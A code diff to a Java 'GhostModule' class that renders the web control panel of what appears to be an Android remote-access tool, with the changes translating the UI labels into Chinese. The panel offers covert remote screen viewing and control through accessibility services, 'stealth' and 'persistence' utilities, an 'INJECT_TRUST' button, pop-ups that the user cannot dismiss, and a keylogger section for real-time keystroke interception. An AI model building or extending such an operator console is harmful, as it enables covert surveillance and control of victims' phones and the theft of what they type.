@@ -341,7 +341,7 @@ public class GhostModule extends BaseModule {
         
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"display:flex; align-items:center; gap:15px; margin-bottom:20px; justify-content: flex-start; text-align: left; font-size: 1.6rem;\">")
-            .append("GHOST_OPERATIONS <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_OPERATIONS', 'Remote interaction and control hub using Accessibility triangulation.')\">INFO</span>")
+            .append("幽灵控制 <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_OPERATIONS', '基于无障碍服务的远程交互与控制中心')\">INFO</span>")
             .append("</h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
@@ -360,7 +360,7 @@ public class GhostModule extends BaseModule {
 
         // --- GHOST_UTILITIES_SECTION ---
         html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
-        html.append("<h2 style=\"color: var(--neon-cyan); margin: 0 0 25px 0; font-size: 1.35rem; text-align: left;\">GHOST_UTILITIES <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_UTILITIES', 'Specialized background protocols for stealth, persistence, and remote maintenance.')\">INFO</span></h2>");
+        html.append("<h2 style=\"color: var(--neon-cyan); margin: 0 0 25px 0; font-size: 1.35rem; text-align: left;\">幽灵工具 <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_UTILITIES', '隐身、持久化与远程维护专用协议')\">INFO</span></h2>");
         html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");
 
         html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px;\">");
@@ -369,10 +369,10 @@ public class GhostModule extends BaseModule {
         html.append("<div class=\"info-item\" style=\"background: rgba(0, 242, 255, 0.03);\">");
         html.append("<div class=\"info-label\" style=\"color: var(--neon-cyan); font-size: 0.8rem;\">MAINTENANCE_SEQUENCES <span class=\"info-trigger\" onclick=\"showInfo(event, 'MAINTENANCE_SEQUENCES', 'Execute system maintenance, telemetry re-synchronization, power optimization, and environment repair protocols.')\">INFO</span></div>");
         html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px;\">");
-        html.append("<button onclick=\"repairProtocol()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); width: 100% !important; margin: 0; font-size: 0.55rem;\">INITIATE_REPAIR</button>");
+        html.append("<button onclick=\"repairProtocol()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); width: 100% !important; margin: 0; font-size: 0.55rem;\">开始修复</button>");
         html.append("<button onclick=\"optimizeStability()\" class=\"btn btn-small\" style=\"border-color: var(--neon-green); color: var(--neon-green); width: 100% !important; margin: 0; font-size: 0.55rem;\">OPTIMIZE_LINK</button>");
         html.append("<button onclick=\"injectTrust()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); width: 100% !important; margin: 0; font-size: 0.55rem;\">INJECT_TRUST</button>");
-        html.append("<button onclick=\"initiateHeal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); width: 100% !important; margin: 0; font-size: 0.55rem;\">INITIATE_HEAL</button>");
+        html.append("<button onclick=\"initiateHeal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); width: 100% !important; margin: 0; font-size: 0.55rem;\">开始自愈</button>");
         html.append("</div></div>");
 
         // 2. Deep Repair Sequences
@@ -430,7 +430,7 @@ public class GhostModule extends BaseModule {
         // Ghost Remote Control Section
         html.append("<div class=\"remote-control-panel\" style=\"align-items: flex-start; justify-content: flex-start;\">");
         html.append("<div style=\"width: 100%; display: flex; flex-direction: column; align-items: flex-start;\">");
-        html.append("<h2 style=\"font-size: 1.35rem; display: flex; align-items: center; gap: 8px; justify-content: flex-start; text-align: left; width: 100%; margin: 0 0 30px 0;\">GHOST_CONTROL <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_CONTROL', 'Real-time interaction with the device UI through accessibility triangulation.')\">INFO</span></h2>");
+        html.append("<h2 style=\"font-size: 1.35rem; display: flex; align-items: center; gap: 8px; justify-content: flex-start; text-align: left; width: 100%; margin: 0 0 30px 0;\">界面控制 <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_CONTROL', '通过无障碍三角定位实时操作设备界面')\">INFO</span></h2>");
         
         // Screen View tool
         html.append("<div class=\"phone-frame\" style=\"margin-bottom: 30px; align-self: center;\">");
@@ -445,7 +445,7 @@ public class GhostModule extends BaseModule {
         html.append("<div style=\"width: 100%; max-width: 280px; display: flex; flex-direction: column; align-items: center; gap: 20px; align-self: center;\">");
         
         // Toggle Initiate/Terminate button (Centered below screen)
-        html.append("<button id=\"ghost-toggle-btn\" onclick=\"toggleGhostScreen()\" class=\"btn\" style=\"width: 100%; border-radius: 12px; margin: 0;\">INITIATE_VIEW</button>");
+        html.append("<button id=\"ghost-toggle-btn\" onclick=\"toggleGhostScreen()\" class=\"btn\" style=\"width: 100%; border-radius: 12px; margin: 0;\">开始预览</button>");
 
         // Single Clean Swipe Up (Menu) button
         html.append("<button onclick=\"fetch('/ghost/interact?action=swipe_up').then(()=>showToast('SWIPE_UP_DISPATCHED'))\" class=\"btn btn-small\" style=\"width: 100%; border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.08); font-weight: bold; border-radius: 8px; margin: 0; padding: 12px; font-size: 0.75rem;\">&#9650; SWIPE UP (MENU)</button>");
@@ -465,20 +465,20 @@ public class GhostModule extends BaseModule {
         // --- RIGHT PANEL: UI INSPECTOR ---
         html.append("<div class=\"inspector-panel\" style=\"align-items: flex-start; justify-content: flex-start;\">");
         html.append("<div style=\"width: 100%; display: flex; flex-direction: column; align-items: flex-start;\">");
-        html.append("<h2 style=\"color: var(--neon-cyan); margin: 0 0 30px 0; font-size: 1.35rem; display: flex; align-items: center; gap: 8px; justify-content: flex-start; text-align: left;\">GHOST_INSPECTOR <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_INSPECTOR', 'Introspect the current application\\'s UI hierarchy and element metadata.')\">INFO</span></h2>");
+        html.append("<h2 style=\"color: var(--neon-cyan); margin: 0 0 30px 0; font-size: 1.35rem; display: flex; align-items: center; gap: 8px; justify-content: flex-start; text-align: left;\">界面检视 <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_INSPECTOR', 'Introspect the current application\\'s UI hierarchy and element metadata.')\">INFO</span></h2>");
         html.append("<div id=\"inspector-tree\" class=\"terminal-text\" style=\"height:600px; width:100%; overflow-y:auto; font-size:0.75rem; border:1px solid rgba(0, 242, 255, 0.1); background: rgba(0,0,0,0.4); text-align: left;\">");
         html.append("[STANDBY] Press REFRESH_TREE to scan active window...");
         html.append("</div></div>");
         
         // Refresh Button
-        html.append("<button onclick=\"refreshInspector()\" class=\"btn\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan); border-radius: 12px; width:100%; max-width:280px; margin: 30px auto 0 auto; align-self: center;\">REFRESH_TREE</button>");
+        html.append("<button onclick=\"refreshInspector()\" class=\"btn\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan); border-radius: 12px; width:100%; max-width:280px; margin: 30px auto 0 auto; align-self: center;\">刷新界面树</button>");
         html.append("</div>"); // Close right panel
 
         html.append("</div>"); // Close interaction-suite
 
         // --- GHOST TOAST CARD ---
         html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow); margin-top: 50px;\">");
-        html.append("<h2 style=\"text-align: left; color: var(--neon-yellow); font-size: 1.35rem; margin: 0 0 15px 0;\">GHOST_TOAST <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_TOAST', 'Force-project non-standard text pop-ups to the device display. Unlike standard notifications, these cannot be swiped away or blocked by the system or user.')\">INFO</span></h2>");
+        html.append("<h2 style=\"text-align: left; color: var(--neon-yellow); font-size: 1.35rem; margin: 0 0 15px 0;\">弹窗显示 <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_TOAST', 'Force-project non-standard text pop-ups to the device display. Unlike standard notifications, these cannot be swiped away or blocked by the system or user.')\">INFO</span></h2>");
         
         html.append("<style>");
         html.append("  input[type='range'] { height: 30px; -webkit-appearance: none; background: transparent; cursor: pointer; }");
@@ -499,7 +499,7 @@ public class GhostModule extends BaseModule {
 
         html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px; margin-bottom: 20px; margin-top: 20px;\">");
         html.append("<input id=\"toast-msg\" type=\"text\" placeholder=\"Message Content\" maxlength=\"150\" style=\"background: #000; border: 1px solid var(--neon-yellow); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
-        html.append("<button type=\"button\" onclick=\"sendEnhancedToast()\" class=\"btn\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); width: 210px !important; margin: 0;\">SEND_TOAST</button>");
+        html.append("<button type=\"button\" onclick=\"sendEnhancedToast()\" class=\"btn\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); width: 210px !important; margin: 0;\">发送弹窗</button>");
         html.append("</div>");
 
         // Color Picker Row
@@ -551,7 +551,7 @@ public class GhostModule extends BaseModule {
         // Ghost Keylogs Section
         html.append("<div id=\"keylogger-box\" class=\"card card-keylogger\" style=\"margin-top: 30px; display: block !important;\">");
         html.append("<div class=\"flex-header\">");
-        html.append("<h2 style=\"color:var(--neon-cyan); margin:0; font-size: 1.35rem; display: flex; align-items: center; gap: 8px;\">&#9000; GHOST_KEYLOGS <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_KEYLOGS', 'Real-time interception of keystrokes and system text.')\">INFO</span></h2>");
+        html.append("<h2 style=\"color:var(--neon-cyan); margin:0; font-size: 1.35rem; display: flex; align-items: center; gap: 8px;\">&#9000; 按键记录 <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_KEYLOGS', 'Real-time interception of keystrokes and system text.')\">INFO</span></h2>");
         html.append("<button onclick=\"clearGhostLogs()\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); margin:0; border-radius: 12px;\">PURGE_LOGS</button>");
         html.append("</div>");
         
